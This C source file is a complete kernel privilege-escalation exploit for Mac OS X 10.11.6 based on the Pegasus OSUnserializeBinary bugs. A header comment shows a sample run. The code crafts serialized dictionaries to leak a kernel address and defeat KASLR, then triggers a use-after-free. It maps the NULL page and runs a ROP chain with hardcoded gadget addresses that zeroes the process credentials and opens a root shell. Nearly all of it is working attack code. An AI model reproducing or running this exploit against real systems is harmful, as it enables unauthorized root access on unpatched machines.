/*
 * $ sw_vers
 * ProductName:    Mac OS X
 * ProductVersion: 10.11.6
 * BuildVersion:   15G31
 *
 * based on: https://jndok.github.io/2016/10/04/pegasus-writeup/

 References:
 - https://www.sektioneins.de/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html
 - https://www.sektioneins.de/blog/16-09-05-pegasus-ios-kernel-vulnerability-explained-part-2.html
 - https://github.com/zhengmin1989/OS-X-10.11.6-Exp-via-PEGASUS

$ ./exploit
[+] Crafting dictionary for infoleak
    [0:0x000000d3]
    [1:0x81000002]
    [2:0x08000004]
    [3:0x00414141]
    [4:0x84000200]
    [5:0x42424242]
    [6:0x42424242]
[+] Dictionary is valid! Spawning UserClient...
[+] UserClient successfully spawned! Leaking bytes...
[+] Done! Calculating KASLR slide...
    [0:0x4242424242424242]
    [1:0xffffff8016a36684]
    [2:0xffffff80179af800]
    [3:0x4]
    [4:0xffffff80188145a0]
    [5:0xffffff8016a366b4]
    [6:0xffffff806decbe30]
    [7:0xffffff800e7934bf]
[+] KASLR slide is 0x0000000e400000
[+] Crafting dictionary for UAF
    [00:0x000000d3]
    [01:0x81000006]
    [02:0x09000004]
    [03:0x00414141]
    [04:0x0b000001]
    [05:0x08000004]
    [06:0x00424242]
    [07:0x0a000020]
    [08:0x00000000]
    [09:0x00000000]
    [0a:0x00000000]
    [0b:0x00000000]
    [0c:0x00000000]
    [0d:0x00000000]
    [0e:0x00000000]
    [0f:0x00000000]
    [10:0x08000004]
    [11:0x00434343]
    [12:0x8c000001]
[+] Building ROP chain
    transfer[0] (vtable): 0xffffff800e825870
    transfer[1] (ropchain): 0xbffc18d8
    [00:0xffffff800ec35400]
    [01:0xffffff800e6b8a26]
    [02:0xffffff800e70e6dc]
    [03:0xffffff800ec551c6]
    [04:0xdeadbeefdeadbeef]
    [05:0xffffff800eba61c0]
    [06:0xffffff800e6b8a26]
    [07:0xffffff800e70e6dc]
    [08:0xffffff800ec551c6]
    [09:0xdeadbeefdeadbeef]
    [0a:0xffffff800eb7a7e0]
    [0b:0xffffff800e6b8a26]
    [0c:0xffffff800e70e6dc]
    [0d:0xffffff800ec551c6]
    [0e:0xdeadbeefdeadbeef]
    [0f:0xffffff800e7a1b7e]
    [10:0xc]
    [11:0xffffff800e50e140]
    [12:0xffffff800e7c7e4a]
[+] Triggering the bug.
[+] Got root!
 */

#define DEBUG 1

#include <stdio.h>          // printf
#include <stdlib.h>         // uint64_t
#include <mach/mach.h>      // kern_return_t
#include <mach/mach_vm.h>   // mach_vm_allocate

#include <IOKit/IOKitLib.h> // host_get_io_master
#include <IOKit/iokitmig.h> // io_service_get_matching_services_bin

#define WRITE_TO_DICT(dict, data) \
  do { \
    *(uint32_t *)(dict + index) = (data); \
    index += 4; \
  } while (0)

#define EXIT_ON_MACH_ERROR(msg, retval) \
  if (kr != KERN_SUCCESS) { \
    mach_error(msg ":" , kr); \
    exit((retval)); \
  }

#define SERVICE "IOHDIXController"
#define LEAK_SIZE 0x200

// #define KERNEL_BASE 0xFFFFFF8000200000
#define SLIDE_PTR(addr) addr + kslide

// defined in xnu-3248.60.10/libkern/libkern/OSSerializeBinary.h
enum 
{
  kOSSerializeDictionary   = 0x01000000U,
  kOSSerializeArray        = 0x02000000U,
  kOSSerializeSet          = 0x03000000U,
  kOSSerializeNumber       = 0x04000000U,
  kOSSerializeSymbol       = 0x08000000U,
  kOSSerializeString       = 0x09000000U,
  kOSSerializeData         = 0x0a000000U,
  kOSSerializeBoolean      = 0x0b000000U,
  kOSSerializeObject       = 0x0c000000U,
  kOSSerializeTypeMask     = 0x7F000000U,
  kOSSerializeDataMask     = 0x00FFFFFFU,
  kOSSerializeEndCollecton = 0x80000000U, // typo is copied from the header file

  kOSSerializeBinarySignature = 0x000000D3U,
};

uint64_t kslide_infoleak(void) {

  kern_return_t kr = 0;
  kern_return_t err = 0;

  mach_port_t result = MACH_PORT_NULL;
  mach_port_t master = MACH_PORT_NULL;

  io_service_t service = 0;
  io_connect_t connect = 0;
  io_iterator_t iterator = 0;

  void *dict = malloc(512);
  uint32_t index = 0; // index to the last element in our dictionary

  printf("[+] Crafting dictionary for infoleak\n");

/*
dictionary entry with one key/value pair:

  <dict>
    <symbol>AAA</symbol>
    <number size=0x200>0x4242424242424242</number>
  </dict>
*/

  // signature, always at the beginning  
  WRITE_TO_DICT(dict, (kOSSerializeBinarySignature));
  // dictionary with two entries
  WRITE_TO_DICT(dict, (kOSSerializeEndCollecton | kOSSerializeDictionary | 2));
  // key with symbol, 3 chars + NULL byte
  WRITE_TO_DICT(dict, (kOSSerializeSymbol | 4)); 
  // 'AAA' key + NULL byte in little-endian
  WRITE_TO_DICT(dict, (0x00414141)); 
  // value with big-size number
  WRITE_TO_DICT(dict, (kOSSerializeEndCollecton | kOSSerializeNumber | LEAK_SIZE)); 
  // at least 8 bytes for our big number
  WRITE_TO_DICT(dict, (0x42424242)); 
  WRITE_TO_DICT(dict, (0x42424242)); 

  // dump the dictionary
#if DEBUG
  for (int i = 0; i < index / 4; i++) {
    printf("    [%x:0x%08x]\n", i, *(uint32_t *) ( dict+i*sizeof(uint32_t)));
  }
#endif

  // get iokit master port
  host_get_io_master(mach_host_self(), &master);
  kr = io_service_get_matching_services_bin(master, (char *)dict, index, &result);
  EXIT_ON_MACH_ERROR("io_service_get_matching_services_bin", kr);

  printf("[+] Dictionary is valid! Spawning UserClient...\n");

  // obtain port to our service (driver object)
  service = IOServiceGetMatchingService(master, IOServiceMatching(SERVICE));
  kr = io_service_open_extended(service, 
                                mach_task_self(), 
                                0, 
                                NDR_record, 
                                (io_buf_ptr_t) dict, 
                                index, 
                                &err, 
                                &connect);
  EXIT_ON_MACH_ERROR("io_service_open_extended", kr);
  printf("[+] UserClient successfully spawned! Leaking bytes...\n");

  // client is created, obtain the mach port represeting our UserClient from ioreg
  IORegistryEntryCreateIterator(service, 
                                "IOService", 
                                kIORegistryIterateRecursively, 
                                &iterator);
  io_object_t object = IOIteratorNext(iterator);

  // reading the property from UserClient
  char buf[LEAK_SIZE] = {0};
  mach_msg_type_number_t buf_count = LEAK_SIZE;
  kr = io_registry_entry_get_property_bytes(object, "AAA", (char *)&buf, &buf_count);
  EXIT_ON_MACH_ERROR("io_registry_entry_get_property_bytes", kr);
  printf("[+] Done! Calculating KASLR slide...\n");

#if DEBUG
  for (int i = 0; i < 8; i++) {
    printf("    [%x:0x%llx]\n", i, *(uint64_t *) ( buf+i*sizeof(uint64_t)));
  }
#endif

  // release the UserClient
  kr = IOServiceClose(connect);
  EXIT_ON_MACH_ERROR("IOServiceClose", kr);

/*
__text:FFFFFF80003934BA                 call    _is_io_registry_entry_get_property_bytes
__text:FFFFFF80003934BF                 mov     [r14+28h], eax
*/
  uint64_t return_addr_leak = (*(uint64_t *)(buf + (7 * sizeof(uint64_t))));
  uint64_t kslide = return_addr_leak - 0xFFFFFF80003934BF;
  printf("[+] KASLR slide is %#016llx\n", kslide);
  return kslide;
}


void use_after_free(uint64_t kslide) {
  /* dictionary structure */
  void *dict = malloc(512);
  uint32_t index = 0;

  kern_return_t kr = 0;
  mach_port_t result = MACH_PORT_NULL;
  mach_port_t master = MACH_PORT_NULL;

  printf("[+] Crafting dictionary for UAF\n");

/*
<dict>
    <string>AAA</string>
    <boolean>true</boolean>
    <symbol>BBB</symbol>
    <data>
        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    </data>
    <symbol>CCC</symbol>
    <reference>1</reference> <!-- we are referring to object 1 in the dictionary, the string -->
</dict>
*/

  // signature
  WRITE_TO_DICT(dict, (kOSSerializeBinarySignature));

  // 6 entries
  WRITE_TO_DICT(dict, (kOSSerializeEndCollecton | kOSSerializeDictionary | 6));

  // string 'AAA', will get freed
  WRITE_TO_DICT(dict, (kOSSerializeString | 4));   
  WRITE_TO_DICT(dict, (0x00414141));

  // bool, true
  WRITE_TO_DICT(dict, (kOSSerializeBoolean | 1));  

  // symbol 'BBB'
  WRITE_TO_DICT(dict, (kOSSerializeSymbol | 4));
  WRITE_TO_DICT(dict, (0x00424242));

  // data (0x00 * 32), would be used as fake vtable
  WRITE_TO_DICT(dict, (kOSSerializeData | 32)); 
  for (int i = 0; i < 8; i++) { WRITE_TO_DICT(dict, (0x00000000)); }

  // symbol 'CCC'
  WRITE_TO_DICT(dict, (kOSSerializeSymbol | 4));
  WRITE_TO_DICT(dict, (0x00434343));

  // ref to object 1 (OSString)
  WRITE_TO_DICT(dict, (kOSSerializeEndCollecton | kOSSerializeObject | 1));
  
  // dump the dictionary
#if DEBUG
  for (int i = 0; i < index / 4; i++) {
    printf("    [%02x:0x%08x]\n", i, *(uint32_t *) ( dict+i*sizeof(uint32_t)));
  }
#endif

  // map the null page
  mach_vm_address_t null_map = 0;
  vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE);
  kr = mach_vm_allocate(mach_task_self(), &null_map, PAGE_SIZE, 0);
  EXIT_ON_MACH_ERROR("mach_vm_allocate", kr);

  printf("[+] Building ROP chain\n");

#define _current_proc                   0xFFFFFF8000835400 
#define _proc_ucred                     0xFFFFFF80007A61C0
#define _posix_cred_get                 0xFFFFFF800077A7E0
#define _bzero                          0xFFFFFF800010E140
#define _thread_exception_return        0xFFFFFF80003C7E4A

#define POP_RCX__RET                    0xFFFFFF80002B8A26 // 59 C3
#define XCHG_EAX_ESP__RET               0xFFFFFF80002B924F // 94 C3
#define NOP__RET                        0xFFFFFF800030E6DC // 90 C3
#define MOV_RDI_RAX__POP_RBP__JMP_RCX   0xFFFFFF80008551C6 // 48 89 C7 5D FF E1
#define POP_RSI__RET                    0xFFFFFF80003A1B7E // 5E C3
#define POP_RSP__RET                    0xFFFFFF8000425870 // 5C C3

  /* ROP chain primitive, to have the payload located on heap, use:
  char *rop_start = malloc(1024);
  */
  char rop_start[1024] = {0};
  uint64_t *rop = (uint64_t *) rop_start;

  // proc = _current_proc() (result would be in RAX)
  *rop++ = SLIDE_PTR(_current_proc);
  *rop++ = SLIDE_PTR(POP_RCX__RET);

  // ucred = _proc_ucred(proc)
  *rop++ = SLIDE_PTR(NOP__RET); // NOP would be in RCX, then RET to next line
  *rop++ = SLIDE_PTR(MOV_RDI_RAX__POP_RBP__JMP_RCX); // store RAX to RDI (1st arg)
  *rop++ = 0xDEADBEEFDEADBEEF; // RBP
  *rop++ = SLIDE_PTR(_proc_ucred);

  // posix_cred = _posix_cred_get(ucred)
  *rop++ = SLIDE_PTR(POP_RCX__RET);
  *rop++ = SLIDE_PTR(NOP__RET);
  *rop++ = SLIDE_PTR(MOV_RDI_RAX__POP_RBP__JMP_RCX); 
  *rop++ = 0xDEADBEEFDEADBEEF;
  *rop++ = SLIDE_PTR(_posix_cred_get);

  // _bzero(posix_cred, sizeof(int) * 3)
  *rop++ = SLIDE_PTR(POP_RCX__RET);
  *rop++ = SLIDE_PTR(NOP__RET);
  *rop++ = SLIDE_PTR(MOV_RDI_RAX__POP_RBP__JMP_RCX); 
  *rop++ = 0xDEADBEEFDEADBEEF;
  *rop++ = SLIDE_PTR(POP_RSI__RET);
  *rop++ = sizeof(int) * 3; // RSI, 2nd arg
  *rop++ = SLIDE_PTR(_bzero);

  // return from the kernel
  *rop++ = SLIDE_PTR(_thread_exception_return);

  // fake vtable, RAX=0, so jump to the NULL page
  *(volatile uint64_t *)(0x20) = (volatile uint64_t) SLIDE_PTR(XCHG_EAX_ESP__RET);

  // now use 'rop_start' address as RSP and execute the ROP chain
  uint64_t *transfer = (uint64_t *) 0x0;
  transfer[0] = SLIDE_PTR(POP_RSP__RET);
  transfer[1] = (uint64_t) rop_start;

/*
  The first 8 bytes (we filled them with zeros) from OSData are used 
  as the object's vtable, which is stored to RAX. 

  Offset for `retain` is 0x20:

__text:FFFFFF800085F3E5 FF 50 20                       call    qword ptr [rax+20h]

  case kOSSerializeObject:
    if (len >= objsIdx) break;
    o = objsArray[len]; // previously freed object, now contains OSData
    o->retain();
    isRef = true;
    break;
*/

#if DEBUG
  printf("    transfer[0] (vtable): 0x%llx\n", transfer[0]);
  printf("    transfer[1] (ropchain): 0x%llx\n", transfer[1]);
  for (int i = 0; i < rop-(uint64_t *) rop_start; i++) {
    printf("    [%02x:0x%0llx]\n", i, *(uint64_t *) (rop_start+i*sizeof(uint64_t)));
  }
#endif

  printf("[+] Triggering the bug.\n");

  // get iokit master port
  host_get_io_master(mach_host_self(), &master);
  io_service_get_matching_services_bin(master, (char *)dict, index, &result);
}

int main(int argc, char * argv[]) {
  sync();

  uint64_t kslide = kslide_infoleak();
  use_after_free(kslide);

  if (getuid() == 0) {
      puts("[+] Got root!");
      system("/bin/bash");
  }

  return 0; // if we return, exploit failed
}
